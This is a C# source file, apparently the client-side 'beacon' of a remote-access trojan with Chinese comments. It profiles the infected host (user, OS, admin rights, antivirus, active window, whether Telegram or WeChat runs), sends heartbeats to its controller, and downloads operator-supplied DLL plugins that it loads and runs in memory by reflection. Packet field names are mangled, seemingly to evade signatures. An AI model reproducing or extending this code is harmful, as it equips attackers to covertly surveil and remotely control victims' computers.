using Beacon.MessagePackLib;
using MPLib.MP;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using static Beacon.Helper.Helper;

namespace Beacon.Helper
{
	/// <summary>
	/// 与传输无关的 Beacon 侧通用处理：上线/心跳、日志/错误、插件加载与路由。
	/// 通过 send 委托完成实际发送，便于 TCP/UDP 复用。
	/// </summary>
	internal static class BeaconHandle
	{
		public static List<BeaconMsgPack> Packs = new List<BeaconMsgPack>();

		private class PluginInstanceRecord
		{
			public PluginDomainController Controller { get; set; }
		}
		private static Dictionary<string, PluginInstanceRecord> _pluginInstances = new Dictionary<string, PluginInstanceRecord>();
		private static readonly Dictionary<string, object> _pluginLocks = new Dictionary<string, object>();

		public static byte[] BuildClientInfo()
		{
			Console.WriteLine("[BeaconHandle] 构建客户端信息");
			
			BeaconMsgPack msgpack = new BeaconMsgPack();
			msgpack.ForcePathObject("BC").AsString = "B";
			msgpack.ForcePathObject("Pac_ket").AsString = "ClientInfo";
			msgpack.ForcePathObject("HWID").AsString = Settings.Hw_id;
			msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
			msgpack.ForcePathObject("OS").AsString = Environment.OSVersion.ToString() + " " + (Environment.Is64BitOperatingSystem ? "64bit" : "32bit");
			msgpack.ForcePathObject("Path").AsString = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
			msgpack.ForcePathObject("Admin").AsString = IsAdmin().ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
			msgpack.ForcePathObject("Perfor_mance").AsString = GetActiveWindowTitle();
			msgpack.ForcePathObject("Anti_virus").AsString = Av();
			msgpack.ForcePathObject("Install_ed").AsString = GetInstallationTime();
			string groupValue = FileStorage.GetStringValue("Group");
			if (string.IsNullOrEmpty(groupValue)) groupValue = Settings.Group;
			msgpack.ForcePathObject("Group").AsString = groupValue;
			string notesValue = FileStorage.GetStringValue("Notes");
			if (!string.IsNullOrEmpty(notesValue)) msgpack.ForcePathObject("Notes").AsString = notesValue;
			msgpack.ForcePathObject("tg").SetAsString(IsProcessExist("telegram.exe") ? "√" : "X");
			msgpack.ForcePathObject("wx").SetAsString(IsProcessExist("weixin.exe") || IsProcessExist("wechat.exe") ? "√" : "X");
			
			var data = msgpack.Encode2Bytes();
			Console.WriteLine($"[BeaconHandle] 客户端信息构建完成，数据长度: {data.Length}");
			return data;
		}

		public static void SendError(Action<byte[]> send, string ex, string CID)
		{
			Console.WriteLine($"[BeaconHandle] 发送错误信息: {ex}");
			
			BeaconMsgPack msgpack = new BeaconMsgPack();
			msgpack.ForcePathObject("Pac_ket").AsString = "Error";
			msgpack.ForcePathObject("Error").AsString = ex;
			msgpack.ForcePathObject("CID").AsString = CID;
			send(msgpack.Encode2Bytes());
		}

		public static void SendLog(Action<byte[]> send, string message, string CID)
		{
			Console.WriteLine($"[BeaconHandle] 发送日志信息: {message}");
			
			BeaconMsgPack msgpack = new BeaconMsgPack();
			msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
			msgpack.ForcePathObject("Message").AsString = message;
			msgpack.ForcePathObject("CID").AsString = CID;
			send(msgpack.Encode2Bytes());
		}

		public static void KeepAlive(Action<byte[]> send)
		{
			try
			{
				Console.WriteLine("[BeaconHandle] 发送心跳包");
				
				BeaconMsgPack msgpack = new BeaconMsgPack();
				msgpack.ForcePathObject("Pac_ket").AsString = "Ping";
				msgpack.ForcePathObject("Perfor_mance").AsString = GetActiveWindowTitle();
				msgpack.ForcePathObject("tg").SetAsString(IsProcessExist("telegram.exe") ? "√" : "×");
				msgpack.ForcePathObject("wx").SetAsString(IsProcessExist("weixin.exe") || IsProcessExist("wechat.exe") ? "√" : "×");
				
				var data = msgpack.Encode2Bytes();
				Console.WriteLine($"[BeaconHandle] 心跳包数据长度: {data.Length}");
				send(data);
				GC.Collect();
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[BeaconHandle] 发送心跳包异常: {ex.Message}");
			}
		}

		public static void OnFrame(Action<byte[]> send, byte[] payload)
		{
			try
			{
				Console.WriteLine($"[BeaconHandle] 处理帧数据，长度: {payload.Length}");
				
				using (var mp = new BeaconMsgPack())
				{
                    mp.DecodeFromBytesUnsafe(payload);
					string type = mp.ForcePathObject("Pac_ket").AsString;
					string CID = mp.ForcePathObject("CID").AsString;
                    
                    Console.WriteLine($"[BeaconHandle] 帧数据类型: {type}，CID: {CID}");
                    
                    switch (type)
					{
						case "plu_gin":
							HandleRunPlugin(send, mp, CID);
							break;
						case "save_Plugin":
							HandleSavePlugin(send, mp, CID);
							break;
						case "updateNotes":
							HandleUpdateNotes(send, mp, CID);
							break;
						case "updateGroup":
							HandleUpdateGroup(send, mp, CID);
							break;
						default:
							ForwardToPluginInstance(mp, CID);
							break;
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[BeaconHandle] 处理帧数据异常: {ex.Message}");
			}
		}

		private static void HandleRunPlugin(Action<byte[]> send, BeaconMsgPack mp, string CID)
		{
			try
			{
				Console.WriteLine($"[BeaconHandle] 处理插件运行请求，CID: {CID}");
				
				string dllHash = mp.ForcePathObject("Dll").AsString;
				if (FileStorage.GetValue(dllHash) == null)
				{
					BeaconMsgPack packToSave = new BeaconMsgPack();
					packToSave.DecodeFromBytesUnsafe(mp.Encode2Bytes());
					packToSave.ForcePathObject("Dll").SetAsString(dllHash);
					packToSave.ForcePathObject("CID").SetAsString(CID);
					Packs.Add(packToSave);
					BeaconMsgPack req = new BeaconMsgPack();
					req.ForcePathObject("Pac_ket").SetAsString("SendPlugin");
					req.ForcePathObject("Hashes").SetAsString(dllHash);
					req.ForcePathObject("CID").SetAsString(CID);
					send(req.Encode2Bytes());
				}
				else
				{
					BeaconMsgPack m = new BeaconMsgPack();
					m.DecodeFromBytesUnsafe(mp.ForcePathObject("Msgpack").GetAsBytes());
					m.ForcePathObject("CID").SetAsString(CID);
					m.ForcePathObject("Dll").SetAsString(dllHash);
					Invoke(send, m);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[BeaconHandle] 处理插件运行请求异常: {ex.Message}");
				SendError(send, ex.Message, CID);
			}
		}

		private static void HandleSavePlugin(Action<byte[]> send, BeaconMsgPack mp, string CID)
		{
			try
			{
				Console.WriteLine($"[BeaconHandle] 处理插件保存请求，CID: {CID}");
				
				string hash = mp.ForcePathObject("Hash").AsString;
				byte[] dllBytes = mp.ForcePathObject("Dll").GetAsBytes();
				FileStorage.SetValue(hash, dllBytes);
				foreach (BeaconMsgPack msgPack in Packs.ToList())
				{
					string msgPackDll = msgPack.ForcePathObject("Dll").AsString;
					if (msgPackDll == hash)
					{
						BeaconMsgPack m = new BeaconMsgPack();
						m.DecodeFromBytesUnsafe(msgPack.ForcePathObject("Msgpack").GetAsBytes());
						m.ForcePathObject("CID").SetAsString(CID);
						m.ForcePathObject("Dll").SetAsString(msgPackDll);
						Invoke(send, m);
						Packs.Remove(msgPack);
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[BeaconHandle] 处理插件保存请求异常: {ex.Message}");
				SendError(send, ex.Message, CID);
			}
		}

		private static void HandleUpdateNotes(Action<byte[]> send, BeaconMsgPack mp, string CID)
		{
			try
			{
				Console.WriteLine($"[BeaconHandle] 处理更新备注请求，CID: {CID}");
				
				string notes = mp.ForcePathObject("Notes").AsString;
				bool success = FileStorage.SetStringValue("Notes", notes);
				if (success) SendLog(send, $"成功修改日志: {notes}", CID);
				else SendError(send, "修改备注失败", CID);
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[BeaconHandle] 处理更新备注请求异常: {ex.Message}");
				SendError(send, $"修改备注失败: {ex.Message}", CID);
			}
		}

		private static void HandleUpdateGroup(Action<byte[]> send, BeaconMsgPack mp, string CID)
		{
			try
			{
				Console.WriteLine($"[BeaconHandle] 处理更新分组请求，CID: {CID}");
				
				string group = mp.ForcePathObject("Group").AsString;
				bool success = FileStorage.SetStringValue("Group", group);
				if (success) SendLog(send, $"成功设置分组: {group}", CID);
				else SendError(send, "设置分组失败", CID);
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[BeaconHandle] 处理更新分组请求异常: {ex.Message}");
				SendError(send, $"错误: {ex.Message}", CID);
			}
		}

		private static void ForwardToPluginInstance(BeaconMsgPack mp, string CID)
		{
			try
			{
				Console.WriteLine($"[BeaconHandle] 转发到插件实例，CID: {CID}");
				
				string dllInfo = mp.ForcePathObject("DLLINFO").AsString;
				foreach (var plugin in _pluginInstances)
				{
					if (plugin.Key.StartsWith($"{CID}_{dllInfo}_"))
					{
						try { plugin.Value.Controller.Read(mp.Encode2Bytes()); } catch { }
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[BeaconHandle] 转发到插件实例异常: {ex.Message}");
			}
		}

		public class PluginDomainController
		{
			private object _pluginInstance;
			private Type _pluginType;

			public void LoadPlugin(byte[] pluginAssemblyBytes)
			{
				var asm = Assembly.Load(pluginAssemblyBytes);
				_pluginType = asm.GetType("Plugin.Plugin");
			}

			public void CreateInstance(Action<byte[]> sendDelegate, Action destroyDelegate)
			{
				_pluginInstance = Activator.CreateInstance(_pluginType, sendDelegate, destroyDelegate);
			}

			public void Read(byte[] data)
			{
				var readMethod = _pluginInstance.GetType().GetMethod("Read");
				readMethod.Invoke(_pluginInstance, new object[] { data });
			}

			public string GetDllInfo()
			{
				var field = _pluginType?.GetField("DLLINFO", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
				return field?.GetValue(null)?.ToString() ?? "Unknown";
			}
		}

		public class SendCallback
		{
			private readonly Action<byte[]> _send;
			public SendCallback(Action<byte[]> send) { _send = send; }
			public void Send(byte[] data) { _send?.Invoke(data); }
		}

		public class DestroyCallback
		{
			private readonly Action _destroy;
			public DestroyCallback(Action destroy) { _destroy = destroy; }
			public void Destroy() { _destroy?.Invoke(); }
		}

		public static void Invoke(Action<byte[]> send, BeaconMsgPack unpack_msgpack)
		{
			try
			{
				Console.WriteLine("[BeaconHandle] 调用插件");
				
				string dllHash = unpack_msgpack.ForcePathObject("Dll").AsString;
				string cid = unpack_msgpack.ForcePathObject("CID").AsString;
				byte[] dllBytes = FileStorage.GetValue(dllHash);
				byte[] decompressedDll = Zip.Decompress(dllBytes);
				
				// 在.NET 8中，AppDomain已被移除，直接在当前域中加载插件
				var controller = new PluginDomainController();
				controller.LoadPlugin(decompressedDll);
				string dllInfo = controller.GetDllInfo();
				string instanceKey = $"{cid}_{dllInfo}_{dllHash}";
				if (!_pluginLocks.ContainsKey(instanceKey)) _pluginLocks[instanceKey] = new object();
				var sendCb = new SendCallback(payload => send(payload));
				Action<byte[]> sendFramedDelegate = new Action<byte[]>(sendCb.Send);
				Action destroyInstanceDelegate = () =>
				{
					try
					{
						if (_pluginInstances.TryGetValue(instanceKey, out var record))
						{
							_pluginInstances.Remove(instanceKey);
						}
					}
					finally
					{
						Console.WriteLine($"插件实例已销毁: {instanceKey}");
					}
				};
				object pluginInstance;
				if (_pluginInstances.TryGetValue(instanceKey, out var existingRecord))
				{
					pluginInstance = existingRecord.Controller;
				}
				else
				{
					var destroyCb = new DestroyCallback(destroyInstanceDelegate);
					Action destroyDelegate = new Action(destroyCb.Destroy);
					controller.CreateInstance(sendFramedDelegate, destroyDelegate);
					_pluginInstances[instanceKey] = new PluginInstanceRecord { Controller = controller };
				}
				lock (_pluginLocks[instanceKey])
				{
					byte[] msgpackBytes = unpack_msgpack.Encode2Bytes();
					var targetController = _pluginInstances[instanceKey].Controller;
					try
					{
						targetController.Read(msgpackBytes);
					}
					catch (Exception ex)
					{
						try
						{
							if (_pluginInstances.TryGetValue(instanceKey, out var bad))
							{
								_pluginInstances.Remove(instanceKey);
							}
							var controller2 = new PluginDomainController();
							controller2.LoadPlugin(decompressedDll);
							var sendCb2 = new SendCallback(payload => send(payload));
							var destroyCb2 = new DestroyCallback(destroyInstanceDelegate);
							controller2.CreateInstance(new Action<byte[]>(sendCb2.Send), new Action(destroyCb2.Destroy));
							_pluginInstances[instanceKey] = new PluginInstanceRecord { Controller = controller2 };
							_pluginInstances[instanceKey].Controller.Read(msgpackBytes);
						}
						catch { throw; }
					}
				}
			}
			catch (Exception e)
			{
				Console.WriteLine($"Invoke Plugin Error: {e.Message}");
				try { SendError(send, $"Invoke发生了异常：{e.Message}", unpack_msgpack.ForcePathObject("CID").AsString); } catch { }
			}
		}
    }
}